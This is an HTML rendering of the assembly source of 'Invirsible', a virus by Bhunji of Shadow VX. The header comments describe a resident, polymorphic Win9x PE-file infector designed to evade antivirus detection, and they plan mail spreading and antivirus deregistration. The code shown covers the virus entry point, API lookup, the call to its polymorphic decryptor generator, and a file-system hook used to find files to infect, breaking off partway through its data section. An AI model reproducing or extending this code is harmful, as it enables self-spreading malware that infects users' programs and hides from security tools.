<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>invirsible.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; Bhunji</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; proudly presents ;)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Invirsible</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Virusinfo</span><span class="sc0">
</span><span class="sc1">; Version               2</span><span class="sc0">
</span><span class="sc1">; Size:                 Big, usually around 7.6k</span><span class="sc0">
</span><span class="sc1">; Infects:              PE files</span><span class="sc0">
</span><span class="sc1">; Resident:             Yes</span><span class="sc0">
</span><span class="sc1">; Systems;              Win9x</span><span class="sc0">
</span><span class="sc1">; Polymorhic:           Yes</span><span class="sc0">

</span><span class="sc1">; This is the second version on Invirsible. My goal with this virus</span><span class="sc0">
</span><span class="sc1">; is to make it as hard as possible to detect. It has one technique</span><span class="sc0">
</span><span class="sc1">; never seen in a virus before which I call the Guide technique. More</span><span class="sc0">
</span><span class="sc1">; info about this can be found at www.shadowvx.org. It carries a very</span><span class="sc0">
</span><span class="sc1">; advanced generic polymorpher. It is able to polymorph mov, add, sub</span><span class="sc0">
</span><span class="sc1">; so far but its trivial to add more instructions. The engine uses</span><span class="sc0">
</span><span class="sc1">; emulation to generate code. It is able to emulate memory and registers</span><span class="sc0">
</span><span class="sc1">; which results in code that looks very real. Coding new code to be</span><span class="sc0">
</span><span class="sc1">; polymorphed is pretty easy as it's similar to Intel asm.</span><span class="sc0">

</span><span class="sc1">; ex. mov RX1,[RX2]</span><span class="sc0">
</span><span class="sc1">; mov Random register 1, [Random register 2]</span><span class="sc0">

</span><span class="sc1">; Changes since last version</span><span class="sc0">
</span><span class="sc1">; A total rewrite of the polymorphic code. Works way better now.</span><span class="sc0">
</span><span class="sc1">; *  Changed the polymorphic language to be more similar to Intel asm</span><span class="sc0">
</span><span class="sc1">; *  Added memory emulation, the created code uses the end of .data segment.</span><span class="sc0">
</span><span class="sc1">; *  Deleted advanced register emulation, did hardly create better code</span><span class="sc0">
</span><span class="sc1">;    and was taking up lots of space.</span><span class="sc0">
</span><span class="sc1">; *  Very generic, adding a new instruction needs 10 lines of data/code</span><span class="sc0">
</span><span class="sc1">;    instead of 200-400 lines.</span><span class="sc0">
</span><span class="sc1">; *  An optimiser that deletes the very worst code. (fx. mov eax,eax)</span><span class="sc0">
</span><span class="sc1">; *  The linked list polymorpher will create a six different looking</span><span class="sc0">
</span><span class="sc1">;    decryptors for the generic polymorpher.</span><span class="sc0">


</span><span class="sc1">; Some changes to the virus</span><span class="sc0">
</span><span class="sc1">; *  Bugfixes. (Doesn't crash on infection :) )</span><span class="sc0">
</span><span class="sc1">; *  Search for slackspace in .data segment. This space is used by the</span><span class="sc0">
</span><span class="sc1">;    generated code to look more like real code.</span><span class="sc0">
</span><span class="sc1">; *  Recompilation of the code before every infection to make the pointers</span><span class="sc0">
</span><span class="sc1">;    point to the .data slack</span><span class="sc0">

</span><span class="sc1">; Things to be added in the future.</span><span class="sc0">
</span><span class="sc1">; *  More instructions will be added to the polymorpher</span><span class="sc0">
</span><span class="sc1">; *  A more powerful optimiser</span><span class="sc0">
</span><span class="sc1">; *  Infect on NT too.</span><span class="sc0">
</span><span class="sc1">; *  Spreading by mail</span><span class="sc0">
</span><span class="sc1">; *  Infection of hlp files</span><span class="sc0">
</span><span class="sc1">; *  EPO</span><span class="sc0">
</span><span class="sc1">; *  Deregister the most common AV software on file but register it later in</span><span class="sc0">
</span><span class="sc1">;    memory. This will not happen if the AV gives the virus its proper name.</span><span class="sc0">
</span><span class="sc1">; *  A better method of upgrading the virus ala babylonia.</span><span class="sc0">

</span><span class="sc1">; And here is an example of what code the engine is able and has been</span><span class="sc0">
</span><span class="sc1">; able to generate.</span><span class="sc0">

</span><span class="sc1">; Version 1</span><span class="sc0">
</span><span class="sc1">; Version one is able to emulate/generate</span><span class="sc0">
</span><span class="sc1">; add, mov</span><span class="sc0">

</span><span class="sc1">; (code is taken from a generated Guide)</span><span class="sc0">

</span><span class="sc1">; mov     ecx, 0Ch</span><span class="sc0">
</span><span class="sc1">; mov     ebx, fs:[ecx]                         ; get random number</span><span class="sc0">
</span><span class="sc1">; mov     edx, 0</span><span class="sc0">
</span><span class="sc1">; add     edx, eax</span><span class="sc0">
</span><span class="sc1">; add     eax, esi</span><span class="sc0">
</span><span class="sc1">; mov     edi, 0</span><span class="sc0">
</span><span class="sc1">; add     edi, 6472DAADh</span><span class="sc0">
</span><span class="sc1">; mov     eax, 5A97451Fh</span><span class="sc0">
</span><span class="sc1">; mov     eax, edx</span><span class="sc0">
</span><span class="sc1">; add     edi, ecx</span><span class="sc0">
</span><span class="sc1">; mov     ecx, 0</span><span class="sc0">
</span><span class="sc1">; add     ecx, ebx</span><span class="sc0">
</span><span class="sc1">; or      ecx, 8</span><span class="sc0">
</span><span class="sc1">; xor     ebx, ecx                              ; 'and' ebx,8</span><span class="sc0">
</span><span class="sc1">; add     edi, 0DCA7B4AAh</span><span class="sc0">
</span><span class="sc1">; add     edi, 60E4CB5Ch</span><span class="sc0">
</span><span class="sc1">; mov     edi, ebx</span><span class="sc0">
</span><span class="sc1">; add     ebx, offset jumptable                 ; add ebx, offset jumptable</span><span class="sc0">
</span><span class="sc1">; jmp     dword ptr [ebx]</span><span class="sc0">


</span><span class="sc1">; patterns</span><span class="sc0">

</span><span class="sc1">; Differences from the trash code</span><span class="sc0">
</span><span class="sc1">; fs:[register]</span><span class="sc0">
</span><span class="sc1">; or/and register,8</span><span class="sc0">
</span><span class="sc1">; jmp [register]</span><span class="sc0">

</span><span class="sc1">; The trashcode</span><span class="sc0">
</span><span class="sc1">; very few instructions</span><span class="sc0">
</span><span class="sc1">; no memory instructions</span><span class="sc0">
</span><span class="sc1">; the same amount of every emulateable instruction (normal code has more</span><span class="sc0">
</span><span class="sc1">; movs then adds for example)</span><span class="sc0">
</span><span class="sc1">; unnecessary instructions. Ex.</span><span class="sc0">
</span><span class="sc1">; mov     eax, 5A97451Fh        ; this is unnessesary</span><span class="sc0">
</span><span class="sc1">; mov     eax, edx              ; as this overwrites eax again</span><span class="sc0">


</span><span class="sc1">; Version 2</span><span class="sc0">
</span><span class="sc1">; Version two is able to emulate</span><span class="sc0">
</span><span class="sc1">; add, sub, mov, and, or, xor and memory</span><span class="sc0">

</span><span class="sc1">; Generates on average more movs then the</span><span class="sc0">
</span><span class="sc1">; adds and more adds then the other opcodes.</span><span class="sc0">
</span><span class="sc1">; Generates more registers then memory operands and</span><span class="sc0">
</span><span class="sc1">; more memory operands then numbers.</span><span class="sc0">
</span><span class="sc1">; The end result 'feels' more like regular code.</span><span class="sc0">
</span><span class="sc1">; Many many bugfixes. (There are no more bugs i hope)</span><span class="sc0">

</span><span class="sc1">; Code is taken from a generated decryptor</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; mov     edx, 8D403766h</span><span class="sc0">
</span><span class="sc1">; xor     [4030D7], 1A45h               ; 1a45 = virussize</span><span class="sc0">
</span><span class="sc1">; xor     esi, [4030CF]</span><span class="sc0">
</span><span class="sc1">; mov     [4030CF], ecx</span><span class="sc0">
</span><span class="sc1">; mov     esi, 45BBA054h</span><span class="sc0">
</span><span class="sc1">; add     edi, 0CCFC6B5Bh</span><span class="sc0">
</span><span class="sc1">; mov     ebx, 1A45h                    ; first "real" instruction   </span><span class="sc0">
</span><span class="sc1">; mov     eax, [4030CF]</span><span class="sc0">
</span><span class="sc1">; sub     edi, 1A45h</span><span class="sc0">
</span><span class="sc1">; or      eax, ebx</span><span class="sc0">
</span><span class="sc1">; mov     edi, 1A45h</span><span class="sc0">
</span><span class="sc1">; mov     edi, 3</span><span class="sc0">
</span><span class="sc1">; add     ecx, 3</span><span class="sc0">
</span><span class="sc1">; mov     edx, [4030BF]                 ; second</span><span class="sc0">
</span><span class="sc1">; add     [4030D7], eax</span><span class="sc0">
</span><span class="sc1">; mov     esi, 3</span><span class="sc0">

</span><span class="sc1">; DecryptLoop:</span><span class="sc0">
</span><span class="sc1">; pusha                                 ; will be deleted in future versions</span><span class="sc0">
</span><span class="sc1">; mov     eax, 1FF5893Dh</span><span class="sc0">
</span><span class="sc1">; mov     ecx, ebx</span><span class="sc0">
</span><span class="sc1">; sub     eax, 0E138ABECh</span><span class="sc0">
</span><span class="sc1">; add     edx, ecx                      ; third</span><span class="sc0">
</span><span class="sc1">; mov     esi, ecx</span><span class="sc0">
</span><span class="sc1">; mov     edi, ebx</span><span class="sc0">
</span><span class="sc1">; mov     eax, 0D6E7BEF5h</span><span class="sc0">
</span><span class="sc1">; mov     [4030CF], 5493B89Ch</span><span class="sc0">
</span><span class="sc1">; sub     ecx, [4030B3]</span><span class="sc0">
</span><span class="sc1">; mov     eax, 0E138ABECh</span><span class="sc0">
</span><span class="sc1">; and     [4030D3], ecx</span><span class="sc0">
</span><span class="sc1">; or      eax, ebx</span><span class="sc0">
</span><span class="sc1">; xor     [edx], 0E138ABECh             ; decrypt code</span><span class="sc0">
</span><span class="sc1">; mov     [4030D7], 0E138ABECh</span><span class="sc0">
</span><span class="sc1">; popa</span><span class="sc0">
</span><span class="sc1">; sub     ebx, 4                        ; </span><span class="sc0">
</span><span class="sc1">; jnb     DecryptLoop</span><span class="sc0">
</span><span class="sc1">; mov     dword_0_4030CF, 69472C81h</span><span class="sc0">
</span><span class="sc1">; mov     ecx, 0F5D970C4h</span><span class="sc0">
</span><span class="sc1">; mov     edi, 1</span><span class="sc0">
</span><span class="sc1">; mov     eax, dword_0_4030B7</span><span class="sc0">
</span><span class="sc1">; add     ecx, 8244076Eh</span><span class="sc0">




</span><span class="sc1">; If we put the real code pieces together we get.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; mov     ebx, 1A45h                    ; VirusSize</span><span class="sc0">
</span><span class="sc1">; mov     edx, [4030BF]                 ; Where to start decrypt</span><span class="sc0">
</span><span class="sc1">; DecryptLoop:</span><span class="sc0">
</span><span class="sc1">; add     edx, ecx                      ; third</span><span class="sc0">
</span><span class="sc1">; xor     dword ptr [edx], 0E138ABECh   ; decrypt code</span><span class="sc0">
</span><span class="sc1">; sub     ebx, 4                        ; </span><span class="sc0">
</span><span class="sc1">; jnb     DecryptLoop</span><span class="sc0">

</span><span class="sc1">; The third instruction should add "Where to start" with "VirusSize" but</span><span class="sc0">
</span><span class="sc1">; as you can see it is added with ecx instead, this is because of the</span><span class="sc0">
</span><span class="sc1">; emulation. The engine knows that ecx = ebx = VirusSize so it used ecx</span><span class="sc0">
</span><span class="sc1">; instead.</span><span class="sc0">

</span><span class="sc1">; patterns</span><span class="sc0">

</span><span class="sc1">; Differences from the trash code</span><span class="sc0">
</span><span class="sc1">; pushad/popad                  ; easy to delete</span><span class="sc0">
</span><span class="sc1">; [Register]                    ; engine is only able to create [Number]</span><span class="sc0">
</span><span class="sc1">; jxx                           ; Engine isnt able to create jumps yet</span><span class="sc0">

</span><span class="sc1">; The trashcode</span><span class="sc0">
</span><span class="sc1">; Still to few instructions, needs push/pop, call, jmp, jxx to look at least</span><span class="sc0">
</span><span class="sc1">; something like real code.</span><span class="sc0">
</span><span class="sc1">; Memory instructions isn't able to create memory pointers with a register</span><span class="sc0">
</span><span class="sc1">; inside, eg [Number+register]. A better compiler will fix this.</span><span class="sc0">
</span><span class="sc1">; Still unnecessary instructions. Ex.</span><span class="sc0">
</span><span class="sc1">; mov     eax, 0D6E7BEF5h       ; this is unnessesary</span><span class="sc0">
</span><span class="sc1">; ...</span><span class="sc0">
</span><span class="sc1">; mov     eax, 1FF5893Dh        ; as this overwrites eax again</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Greetings</span><span class="sc0">
</span><span class="sc1">; (M)asmodeus.  Dropper.exe has generated errors and will be closed by</span><span class="sc0">
</span><span class="sc1">;               Windows :)))</span><span class="sc0">
</span><span class="sc1">; Morphi        Hoppas att du f†r det b„ttre i helsingborg</span><span class="sc0">
</span><span class="sc1">; Prizzy        Thanks for helping me with the bug</span><span class="sc0">
</span><span class="sc1">; Ruzz          Yes, i have FINALY finished it :)</span><span class="sc0">
</span><span class="sc1">; Kamaileon.    I wish you luck with the windows programming.</span><span class="sc0">
</span><span class="sc1">; Clau      Hello sister ;)</span><span class="sc0">
</span><span class="sc1">; Urgo32        Good luck with your next virus.</span><span class="sc0">




</span><span class="sc9">includelib</span><span class="sc0"> </span><span class="sc5">kernel32.lib</span><span class="sc0">
</span><span class="sc9">includelib</span><span class="sc0"> </span><span class="sc5">user32.lib</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">masm</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">windows.inc</span><span class="sc0">


</span><span class="sc2">.486</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc5">ExitProcess</span><span class="sc0">     </span><span class="sc9">PROTO</span><span class="sc0">   </span><span class="sc4">,:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">MessageBoxA</span><span class="sc0">     </span><span class="sc9">PROTO</span><span class="sc0">   </span><span class="sc4">,:</span><span class="sc10">DWORD</span><span class="sc4">,:</span><span class="sc10">DWORD</span><span class="sc4">,:</span><span class="sc10">DWORD</span><span class="sc4">,:</span><span class="sc10">DWORD</span><span class="sc0">


</span><span class="sc1">; Primes, used them in the first version for advanced register emulation,</span><span class="sc0">
</span><span class="sc1">; might be usefull in the future</span><span class="sc0">

</span><span class="sc5">Prime1</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">Prime2</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">Prime3</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">Prime4</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">Prime5</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc5">Prime6</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc5">Prime7</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">17</span><span class="sc0">
</span><span class="sc5">Prime8</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">19</span><span class="sc0">
</span><span class="sc5">Prime9</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">23</span><span class="sc0">
</span><span class="sc5">Prime10</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">29</span><span class="sc0">
</span><span class="sc5">Prime11</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">31</span><span class="sc0">
</span><span class="sc5">Prime12</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">37</span><span class="sc0">
</span><span class="sc5">Prime13</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">41</span><span class="sc0">
</span><span class="sc5">Prime14</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">43</span><span class="sc0">
</span><span class="sc5">Prime15</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">47</span><span class="sc0">
</span><span class="sc5">Prime16</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">53</span><span class="sc0">
</span><span class="sc5">Prime17</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">59</span><span class="sc0">
</span><span class="sc5">Prime18</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">61</span><span class="sc0">
</span><span class="sc5">Prime19</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">67</span><span class="sc0">
</span><span class="sc5">Prime20</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">71</span><span class="sc0">
</span><span class="sc5">Prime21</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">73</span><span class="sc0">
</span><span class="sc5">Prime22</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">77</span><span class="sc0">


</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">VirusStr</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"No crack found"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">
   </span><span class="sc5">ProgramMain</span><span class="sc4">:</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc5">_rsrc</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">para</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_rsrc</span><span class="sc0">


  </span><span class="sc5">VirusStart</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc5">Main</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">

     </span><span class="sc5">GetDelta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetDelta</span><span class="sc0">             </span><span class="sc1">; address</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">Temp</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">                  </span><span class="sc1">; save offset into kernel</span><span class="sc0">

        </span><span class="sc9">.if</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">!</span><span class="sc4">=</span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">; code that isn't</span><span class="sc0">
                                                </span><span class="sc1">; executed in the first </span><span class="sc0">
                                                </span><span class="sc1">; version</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; polymorphic code will</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">InfectedProgramOffset</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; move pointer to </span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">                                  </span><span class="sc1">; programstart in eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">BreakPoint1</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetDelta</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; move some address to </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">PointerToDataSlack</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; PTDS, doesnt matter as</span><span class="sc0">
                                                </span><span class="sc1">; long as its a working one</span><span class="sc0">

        </span><span class="sc1">; mov eax,fs:[0c]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">67h</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">0a1h</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">            </span><span class="sc1">; get random number</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">RandomNumber</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; (is not random on NT)</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAPIFunctions</span><span class="sc0">                 </span><span class="sc1">; Get needed API functions </span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FixTables</span><span class="sc0">                       </span><span class="sc1">; clean the 'dirty' tables</span><span class="sc0">
                                                </span><span class="sc1">; and allocate mem for the</span><span class="sc0">
                                                </span><span class="sc1">; polymorpher</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateGuideAndDecryptor</span><span class="sc0">         </span><span class="sc1">; Generate the polymorphic</span><span class="sc0">
                                                </span><span class="sc1">; code</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetResident</span><span class="sc0">                     </span><span class="sc1">; intercept IFSMgr to get</span><span class="sc0">
                                                </span><span class="sc1">; filenames to infect</span><span class="sc0">


    </span><span class="sc5">ReturnToHost</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">MemPtr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; free allocated mem used</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">LocalFree</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; by polymorpher</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">InfectedProgramOffset</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; program address</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">; restore ebp</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; jmp to program</span><span class="sc0">

</span><span class="sc5">Topic</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"You can not find what you can not see."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Invirsible by Bhunji (Shadow VX)"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">VSize</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">VirusEnd</span><span class="sc4">-</span><span class="sc5">VirusStart</span><span class="sc0">
        </span><span class="sc5">VirusSize</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">VSize</span><span class="sc0">



</span><span class="sc1">; how much stack and mem should the polymorpher use</span><span class="sc0">

        </span><span class="sc5">NumberOfOffsets</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10</span><span class="sc0">      </span><span class="sc1">; more size = better code</span><span class="sc0">
                                                </span><span class="sc1">; (doesnt matter right now</span><span class="sc0">
                                                </span><span class="sc1">; because the engine isnt</span><span class="sc0">
                                                </span><span class="sc1">; able to create jumps)</span><span class="sc0">
        </span><span class="sc5">StackSize</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">100</span><span class="sc0">     </span><span class="sc1">; (doesnt matter right now</span><span class="sc0">
                                                </span><span class="sc1">; because the engine isnt</span><span class="sc0">
                                                </span><span class="sc1">; able to emulate the stack)</span><span class="sc0">

        </span><span class="sc5">MemorySize</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10</span><span class="sc0">      </span><span class="sc1">; The more size the better</span><span class="sc0">
                                                </span><span class="sc1">; code is produced but makes</span><span class="sc0">
                                                </span><span class="sc1">; it harder to find a file to</span><span class="sc0">
                                                </span><span class="sc1">; infect</span><span class="sc0">


        </span><span class="sc5">LinesOfTrash</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">; LinesOfTrash is the</span><span class="sc0">
                                                </span><span class="sc1">; aproximate numbers of</span><span class="sc0">
                                                </span><span class="sc1">; random instructions between</span><span class="sc0">
                                                </span><span class="sc1">; every "legal" instruction</span><span class="sc0">

                                                </span><span class="sc1">; LinesOfTrash</span><span class="sc0">
                                                </span><span class="sc1">; Fixup instruction</span><span class="sc0">
                                                </span><span class="sc1">; LinesOfTrash</span><span class="sc0">

        </span><span class="sc5">EndValueFrecuency</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; the higher the more often</span><span class="sc0">
                                                </span><span class="sc1">; is the EndValue chosed</span><span class="sc0">
                                                </span><span class="sc1">; the higher the number is</span><span class="sc0">
                                                </span><span class="sc1">; the harder is it to detect</span><span class="sc0">
                                                </span><span class="sc1">; my looking at one</span><span class="sc0">
                                                </span><span class="sc1">; instruction, but its easier</span><span class="sc0">
                                                </span><span class="sc1">; to detect by looking at many</span><span class="sc0">
                                                </span><span class="sc1">; instructions.</span><span class="sc0">
                                                </span><span class="sc1">; 1 is a perfect value</span><span class="sc0">

        </span><span class="sc5">MemPtr</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; ptr to allocated mem</span><span class="sc0">
        </span><span class="sc5">ReturnAddress</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; stores the return address</span><span class="sc0">
                                                </span><span class="sc1">; in some functions</span><span class="sc0">


        </span><span class="sc5">InfectedProgramOffset</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">ProgramMain</span><span class="sc0">     </span><span class="sc1">; where to jump when</span><span class="sc0">
                                                </span><span class="sc1">; done</span><span class="sc0">

        </span><span class="sc5">Temp</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; just a temporary variable</span><span class="sc0">

                                                </span><span class="sc1">; API's the virus uses</span><span class="sc0">
   </span><span class="sc5">WinFunctions</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">lstrlenStr</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"lstrlen"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">LocalAllocStr</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"LocalAlloc"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">LocalFreeStr</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"LocalFree"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                                                </span><span class="sc1">; pointers to these</span><span class="sc0">
   </span><span class="sc5">Functions</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">lstrlen</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">AllocMem</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
